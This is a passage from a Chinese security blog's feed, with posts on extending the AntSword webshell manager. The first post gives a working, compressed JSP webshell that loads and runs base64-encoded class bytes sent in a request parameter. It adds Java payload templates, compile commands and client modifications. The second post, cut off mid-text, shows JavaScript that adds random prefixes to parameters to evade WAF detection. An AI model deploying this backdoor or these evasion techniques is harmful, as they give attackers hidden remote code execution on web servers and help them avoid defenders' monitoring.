中提出了一种新的jsp一句话的实现方式：利用classloader直接解析编译后的class字节码，相当于实现了一个java的eval功能。</p><p>反复阅读rebeyond大佬的文章，不得不感叹思路的巧妙。</p><p>自己以前通过类反射+动态加载字节码的方式实现了一个命令执行后门，但是是在shell中获取的输入输出。参数个数也不可控，只能一股脑按最大数传进去，还会有类反射的特征。</p><p>然而冰蝎是直接重写了Object类的equals方法，并且把pageContext传了进去。熟悉jsp的同学都知道，通过pageContext就可以控制几乎所有的页面对象，也就可以在payload中动态控制输入输出。</p><p>冰蝎的方法既没有类反射之类的特征，又便于控制输入输出，实在是妙。</p><p>但是冰蝎很久没更新了，并且暂时没有开源，有些小BUG修改起来非常麻烦。我就想能否把这个功能给移植到蚁剑上。</p><p>冰蝎的操作是直接用asm框架来修改提前写好的字节码文件，把要传入的参数直接编译进去。由于冰蝎自身就是java写的，所以动态产生字节码具有天生的优势。但是蚁剑的后端是nodejs，这怎么办呢？</p><h3 id="思路的选择">思路的选择</h3><p>大概有以下三种思路：</p><p>（1）用nodejs来修改java字节码。</p><p>（2）写一个专门用来生成payload的jar包，每次执行前调用此jar包，把需要编译的参数通过命令行传入，然后获取回显。</p><p>（3）在蚁剑中硬编码payload，然后通过getParameter把参数传进去。</p><p>三种方式各有利弊，第一个想法最简单，但是难度大。超出了本人菜鸟教程上学来的java跟node水平。</p><p>自己本来是想采用第二个思路，跟yan表哥交流后放弃。就不说用exec调用会不会产生命令注入这种东西，采用第二种方式需要修改蚁剑原有的模式框架，并且还需要配置java环境。而蚁剑从设计之初就是想着能尽量减少对环境的需求。尽管从2.0系列推出加载器后不再需要node环境就可以运行蚁剑，但是目前还是有一堆人连安装蚁剑都有困难。</p><p>所以在本文中实现的是第三种思路，<strong>硬编码payload+其他参数传参</strong>。</p><p>首先根据现成的custom脚本来编写payload，然后把custom的模板给复制一份，把传递的函数名替换成payload即可。</p><p>采用这种模式的话就跟其他shell发送payload的模式相同，不需要对蚁剑原有的框架进行大改。只不过其他类型传递的是可见的代码，jsp传递的是编译后的字节码。</p><h3 id="具体实现">具体实现</h3><h4 id="编译环境的选择">编译环境的选择</h4><p>首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。</p><p>编译命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp &quot;D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar&quot; Test.java</span><br></pre></td></tr></table></figure><p>保存编译后的class字节码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w 0 Test.class &gt; Test.txt</span><br></pre></td></tr></table></figure><h4 id="乱码问题的解决">乱码问题的解决</h4><p>然后是让人头秃的乱码问题。</p><p>众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。</p><p>在php版的custom中对于编码是这样处理的：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376517-54063213-d7fb-456c-8380-703ee6d77605.png" alt="img"></p><p>其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。</p><p>decode函数是对字符串进行解码，比如说base64、hex这种。</p><p>但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。</p><p>调试了一下果然会乱码，然后报找不到路径的错误。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376696-e8244a99-8c0b-4c51-b717-701fa83c6c30.png" alt="img"></p><p>解决方法就是把两个函数换换位置就好了。</p><p>换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376817-ab8582dc-f487-42df-8c65-b13a10853c03.png" alt="img"></p><p>把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。</p><p>突然想起来自己以前提的一个issue <a href="https://github.com/AntSwordProject/antSword/issues/143" target="_blank" rel="noopener">jsp的bug</a>，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376935-ea43e09f-4c2a-44c8-9b2e-de5cb7d568b5.png" alt="img"></p><p>经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377017-ff2605ab-e912-4ab6-ae77-2bc5bbcf10b8.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377110-f6e42800-544d-4d9f-bc71-47868ff1a477.png" alt="img"></p><p>原因为什么呢？</p><p>因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。</p><p>但是经过测试php类型会正常的根据用户的字符类型来base64编码。</p><p>emmmm，玄学问题。</p><p>最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。</p><h4 id="模板设计">模板设计</h4><p>Shell模板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader&#123;</span><br><span class="line">        U(ClassLoader c)&#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte []b)&#123;</span><br><span class="line">            return super.defineClass(b,0,b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    BASE64Decoder decoder=new sun.misc.BASE64Decoder();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls=request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if(cls!=null)&#123;</span><br><span class="line">    new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!class U extends ClassLoader&#123; U(ClassLoader c)&#123; super(c); &#125;public Class g(byte []b)&#123; return super.defineClass(b,0,b.length); &#125;&#125;%&gt;&lt;% String cls=request.getParameter(&quot;ant&quot;);if(cls!=null)&#123; new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); &#125;%&gt;</span><br></pre></td></tr></table></figure><p>Payload模板</p><p>其中<code>encoder</code>为编码方式，默认为空，可选hex或者base64。<code>charset</code>为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。</p><p><strong>注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.jsp.PageContext;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public String encoder;</span><br><span class="line">    public String cs;</span><br><span class="line">    @Override</span><br><span class="line">    public boolean equals(Object obj) &#123;</span><br><span class="line">        PageContext page = (PageContext)obj;</span><br><span class="line">        ServletRequest request = page.getRequest();</span><br><span class="line">        ServletResponse response = page.getResponse();</span><br><span class="line">        encoder = request.getParameter(&quot;encoder&quot;)!=null?request.getParameter(&quot;encoder&quot;):&quot;&quot;;</span><br><span class="line">        cs=request.getParameter(&quot;charset&quot;)!=null?request.getParameter(&quot;charset&quot;):&quot;UTF-8&quot;;</span><br><span class="line">        StringBuffer output = new StringBuffer(&quot;&quot;);</span><br><span class="line">        StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            response.setContentType(&quot;text/html&quot;);</span><br><span class="line">            request.setCharacterEncoding(cs);</span><br><span class="line">            response.setCharacterEncoding(cs);</span><br><span class="line">            String var0 = EC(decode(request.getParameter(&quot;var0&quot;)+&quot;&quot;));</span><br><span class="line">            String var1 = EC(decode(request.getParameter(&quot;var1&quot;)+&quot;&quot;));</span><br><span class="line">            String var2 = EC(decode(request.getParameter(&quot;var2&quot;)+&quot;&quot;));</span><br><span class="line">            String var3 = EC(decode(request.getParameter(&quot;var3&quot;)+&quot;&quot;));</span><br><span class="line">            output.append(&quot;-&gt;&quot; + &quot;|&quot;);</span><br><span class="line">            sb.append(func(var1));</span><br><span class="line">            output.append(sb.toString());</span><br><span class="line">            output.append(&quot;|&quot; + &quot;&lt;-&quot;);</span><br><span class="line">            page.getOut().print(output.toString());</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    String EC(String s) throws Exception &#123;</span><br><span class="line">        if(encoder.equals(&quot;hex&quot;)) return s;</span><br><span class="line">        return new String(s.getBytes(), cs);</span><br><span class="line">    &#125;</span><br><span class="line">    String decode(String str) throws Exception&#123;</span><br><span class="line">        if(encoder.equals(&quot;hex&quot;))&#123;</span><br><span class="line">            if(str==&quot;null&quot;||str.equals(&quot;null&quot;))&#123;</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            String hexString = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">            str = str.toUpperCase();</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);</span><br><span class="line">            String ss = &quot;&quot;;</span><br><span class="line">            for (int i = 0; i &lt; str.length(); i += 2)&#123;</span><br><span class="line">                ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &quot;,&quot;;</span><br><span class="line">                baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))));</span><br><span class="line">            &#125;</span><br><span class="line">            return baos.toString(&quot;UTF-8&quot;);</span><br><span class="line">        &#125;else if(encoder.equals(&quot;base64&quot;))&#123;</span><br><span class="line">            byte[] bt = null;</span><br><span class="line">            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();</span><br><span class="line">            bt = decoder.decodeBuffer(str);</span><br><span class="line">            return new String(bt,&quot;UTF-8&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return str;</span><br><span class="line">    &#125;</span><br><span class="line">    String func (String var1)&#123;</span><br><span class="line">    // Your code</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个栗子，写一个返回hello+名字的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.jsp.PageContext;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">public class Test &#123;</span><br><span class="line">    public String encoder;</span><br><span class="line">    public String cs;</span><br><span class="line">    @Override</span><br><span class="line">    public boolean equals(Object obj) &#123;</span><br><span class="line">        PageContext page = (PageContext)obj;</span><br><span class="line">        ServletRequest request = page.getRequest();</span><br><span class="line">        ServletResponse response = page.getResponse();</span><br><span class="line">        encoder = request.getParameter(&quot;encoder&quot;)!=null?request.getParameter(&quot;encoder&quot;):&quot;&quot;;</span><br><span class="line">        cs=request.getParameter(&quot;charset&quot;)!=null?request.getParameter(&quot;charset&quot;):&quot;UTF-8&quot;;</span><br><span class="line">        StringBuffer output = new StringBuffer(&quot;&quot;);</span><br><span class="line">        StringBuffer sb = new StringBuffer(&quot;&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            response.setContentType(&quot;text/html&quot;);</span><br><span class="line">            request.setCharacterEncoding(cs);</span><br><span class="line">            response.setCharacterEncoding(cs);</span><br><span class="line">            String var0 = EC(decode(request.getParameter(&quot;var0&quot;)+&quot;&quot;));</span><br><span class="line">            output.append(&quot;-&gt;&quot; + &quot;|&quot;);</span><br><span class="line">            sb.append(test(var0));</span><br><span class="line">            output.append(sb.toString());</span><br><span class="line">            output.append(&quot;|&quot; + &quot;&lt;-&quot;);</span><br><span class="line">            page.getOut().print(output.toString());</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(&quot;ERROR&quot; + &quot;:// &quot; + e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    String EC(String s) throws Exception &#123;</span><br><span class="line">        if(encoder.equals(&quot;hex&quot;)) return s;</span><br><span class="line">        return new String(s.getBytes(), cs);</span><br><span class="line">    &#125;</span><br><span class="line">    String decode(String str) throws Exception&#123;</span><br><span class="line">        if(encoder.equals(&quot;hex&quot;))&#123;</span><br><span class="line">            if(str==&quot;null&quot;||str.equals(&quot;null&quot;))&#123;</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            String hexString = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">            str = str.toUpperCase();</span><br><span class="line">            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);</span><br><span class="line">            String ss = &quot;&quot;;</span><br><span class="line">            for (int i = 0; i &lt; str.length(); i += 2)&#123;</span><br><span class="line">                ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &quot;,&quot;;</span><br><span class="line">                baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))));</span><br><span class="line">            &#125;</span><br><span class="line">            return baos.toString(&quot;UTF-8&quot;);</span><br><span class="line">        &#125;else if(encoder.equals(&quot;base64&quot;))&#123;</span><br><span class="line">            byte[] bt = null;</span><br><span class="line">            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();</span><br><span class="line">            bt = decoder.decodeBuffer(str);</span><br><span class="line">            return new String(bt,&quot;UTF-8&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return str;</span><br><span class="line">    &#125;</span><br><span class="line">    String test(String var0)&#123;</span><br><span class="line">        return &quot;Hello&quot; + var0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译成class文件，base64后输出到Test.txt中</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377200-6624723f-a55e-4e92-962c-2e000ca5c369.png" alt="img"></p><p>再发送payload，其中var0是我们要传入的参数。可以看到屏幕上打印出了<code>Hello yzddmr6</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377288-46721820-1df2-4531-baf0-9110aa8cbd8c.png" alt="img"></p><p>默认是明文传递，想要进行base64编码的话将<code>encoder=base64</code>加在请求中即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377392-0e0f862a-0c6e-44d0-b79c-d8eb29837d8b.png" alt="img"></p><p>如果是手工发送的话要注意：</p><p><strong>一定要URL编码！！！</strong></p><p><strong>一定要URL编码！！！</strong></p><p><strong>一定要URL编码！！！</strong></p><p>当初忘了给Payload URL编码，一直各种花式报错，卡在这里一天。。。最后在rebeyond大佬提醒下才反应过来。。。我真是个弟弟</p><h4 id="蚁剑客户端修改">蚁剑客户端修改</h4><p>在<code>\source\app.entry.js</code> <code>\source\core\index.js</code> <code>\source\modules\settings\encoders.js</code>里增加jsp类型</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377491-5c116c5c-a3c2-4698-bb77-13c6cf48c3ad.png" alt="img"></p><p>在<code>\source\modules\shellmanager\list\form.js</code>增加对jsp后缀shell类型的识别</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377578-a281bd12-b05a-44fa-904d-8aa1d8ee1a4a.png" alt="img"></p><p>在base64编码器模板里增加发送的接口，虽然没有实现decoder，但是还是留个接口吧。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377660-efbb271e-8ef8-454f-80c5-ae78e99aea0b.png" alt="img"></p><p>然后就是用编译后的payload替换原来的函数名</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377794-cd64d8ed-762a-4c8e-bee3-59ff6e530877.png" alt="img"></p><h4 id="实现效果">实现效果</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377926-a59ce1d5-3a21-4e4a-ac8d-186c4e7a6f19.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378054-8acd0b19-09f3-4f20-8340-f093c25ba42b.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378184-2bede958-4205-495e-a3d1-8d52c6928e6f.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378309-a08aee5a-c350-4bf5-9964-5968b50a5fac.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378690-a5468e9e-795c-4477-8787-8257852d8323.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378842-bc83adb9-99e3-4955-879e-e56de21e91e8.png" alt="img"></p><p>本地每个功能都测试过，也完美支持中文。用起来跟其他类型的shell没有什么区别，四舍五入那就等于没BUG吧~</p><h2 id="最后">最后</h2><p>有同学可能会问为什么不写回显信息编码函数呢？</p><p>因为在目前方式下特征太明显了，根本不需要根据回显信息就可以识别。写了后还会导致payload很长，并且还会增加一个<code>decoder=xxx</code>的特征，所以就没加。同时传递的<code>encoder=xxx</code>也没有编码，不管怎么编码都是WAF加一条规则的事情。</p><p>目前只是处在能用的阶段，无法做到随机变量名等操作，存在很多的硬性特征。在找到有效的解决方法前，本功能可能并不会合并到蚁剑主体中。</p><p>因为payload实在是太多了，所以我就单独开了一个项目来存放源码：<a href="https://github.com/yzddmr6/JspForAntSword" target="_blank" rel="noopener">JspForAntSword</a> 如果有什么好的建议欢迎提pr</p><p>修改后的蚁剑(2.1.x分支)：</p><p><a href="https://github.com/yzddmr6/antSword/tree/v2.1.x" target="_blank" rel="noopener">https://github.com/yzddmr6/antSword/tree/v2.1.x</a></p><p>感谢@rebeyond大佬的提醒，同时也感谢@Medici.yan表哥这几天一直跟我交流那么多。</p><p>深刻的体会到独学则无友。如果有什么写的不对的地方希望师傅们提出，希望大佬们能多带带弟弟QAQ。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。&lt;/p&gt;&lt;p&gt;因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="中国蚁剑" scheme="https://yzddmr6.tk/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>蚁剑改造计划之实现其他参数的随机化</title>
    <link href="https://yzddmr6.tk/posts/antsword-diy-2/"/>
    <id>https://yzddmr6.tk/posts/antsword-diy-2/</id>
    <published>2020-03-11T09:40:10.000Z</published>
    <updated>2021-06-17T15:36:48.256Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。</p><p>因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。</p><p>不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。</p><ul><li><p><a href="https://xz.aliyun.com/t/6571" target="_blank" rel="noopener">蚁剑改造计划之实现动态秘钥编码器解码器</a></p></li><li><p><a href="https://xz.aliyun.com/t/6917" target="_blank" rel="noopener">蚁剑改造计划之基于随机Cookie的动态秘钥编码器</a></p></li><li><p><a href="https://xz.aliyun.com/t/7126" target="_blank" rel="noopener">蚁剑改造计划之增加垃圾数据</a></p></li></ul><h2 id="正文">正文</h2><h3 id="历史遗留问题">历史遗留问题</h3><p>我在前面几篇文章提到过，蚁剑一直有一个硬伤就是它对于其他参数的处理仅仅是一层base64。这就导致了不管怎么对主payload加密，WAF只要分析到其他的参数就能知道你在做什么。</p><p>例如你在执行cmd的时候，就一定会发送一个经过base64编码的cmd字符串，这就留下了一个被WAF识别的特征。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900373995-09645b59-3fd1-4998-a4e0-efdcd03cfddd.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900374255-664ccb55-dea1-4d9e-80cc-48d2eaa71c36.png" alt="img"></p><p>即使是蚁剑编码器仓库中的aes编码器也只是对主payload加了密，防护方在不需要解密主payload的情况下只要看到其他参数传的什么内容就能推测攻击者的行为。</p><p>yan表哥曾经在公众号中的<a href="https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw" target="_blank" rel="noopener">WAF拦了蚁剑发送的其它参数时怎么操作</a>文章中给出了一种解决方案。主要思想就是在不修改主payload的情况下，配合客户端额外再把它加密解密一遍。</p><p>可以是可以，但是很麻烦，对于普通的shell不具有适用性。</p><p>这篇文章的目的就是解决掉这个历史遗留问题。</p><h3 id="随机化方式的选择">随机化方式的选择</h3><p>想要从根本上解决问题就要修改核心payload，那么怎么改呢？</p><p>以前师傅们的文章提出过两个方法，一种是把其他参数base64两次，还有一种是在其他参数前面加两个随机字符，然后主payload中再把它给substr截掉，来打乱base64的解码。</p><p>如果方法是写死的话，无非只是WAF增加两条规则而已。蚁剑这么有名的项目，一定是防火墙商眼中紧盯的目标。最好的解决办法就是加入一个用户可控的参数，能够让用户自定义修改。这样才有可能最大程度的逃过WAF的流量查杀。</p><p>所以本文采用的方法就是在每个第三方参数前，加入用户自定义长度的随机字符串，来打乱base64的解码。</p><p>这时，如果WAF不能获得主payload中用户预定义的偏移量，也就无法对其他参数进行解密。此时我们的强加密型编码器才能真正起到作用。</p><h3 id="具体实现">具体实现</h3><p>思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取用户预定义前缀偏移量-&gt;修改核心payload模版-&gt;给其他参数前增加随机字符串</span><br></pre></td></tr></table></figure><p>前端的话首先写一个text框，来获取用户的输入</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900374380-93a91938-c86e-4665-a563-1b7fb578d46e.png" alt="img"></p><p>在<code>\source\core\base.js</code>中定义randomPrefix变量</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900374581-26dd0ddb-0a32-4657-b406-3c7c315ba352.png" alt="img"></p><p>在<code>\source\modules\settings\adefault.js</code>中设置默认值</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900374704-0091de9a-5183-4cf5-b87d-79ac9497522a.png" alt="img"></p><p>然后后端就可以通过<code>opts.otherConf[&quot;random-Prefix&quot;]</code>来获取用户定义的随机前缀的长度值。</p><p>修改模版前要简单了解一下蚁剑对于参数的处理流程</p><p>在各类型shell的模版文件中，会定义默认的payload以及他们所需要的参数，还有对于参数的编码方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source\core\php\template\filemanager.js</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900374810-81263964-0ca4-4d9d-abda-d07217e2c53f.png" alt="img"></p><p>在获取到模版之后，parseTemplate会对其中的参数进行提取、解析、组合，形成要发送的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source\core\base.js</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900374956-605a2fe5-9041-4a62-863c-afd37998d839.png" alt="img"></p><p>所以我们要把用户预定义的前缀偏移量传入到两个地方：</p><p>（1）核心payload模版</p><p>（2）其他参数的组合模块</p><p>在核心payload中，我们将要修改的偏移量用<code>#randomPrefix#</code>进行标记，到parseTemplate函数组合最终数据包的时候将其替换。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900375126-c9b2c1c4-e533-4d45-9b53-6c7dd31925f4.png" alt="img"></p><p>然后定义一个新类型的编码处理器<code>newbase64</code>，在模板中修改对于参数的处理函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">       * 增加随机前缀的base64编码</span><br><span class="line">       * @param  &#123;String&#125; str 字符串</span><br><span class="line">       * @return &#123;String&#125;     编码后的字符串</span><br><span class="line">       */</span><br><span class="line">      newbase64(str) &#123;</span><br><span class="line">        let randomString=(length)=&gt;&#123;</span><br><span class="line">          let chars=&apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;</span><br><span class="line">          let result = &apos;&apos;;</span><br><span class="line">          for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)];</span><br><span class="line">          return result;</span><br><span class="line">      &#125;</span><br><span class="line">        return randomString(randomPrefix)+Buffer.from(iconv.encode(Buffer.from(str), encode)).toString(&apos;base64&apos;);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>修改后的模板长这个样</p><p><img 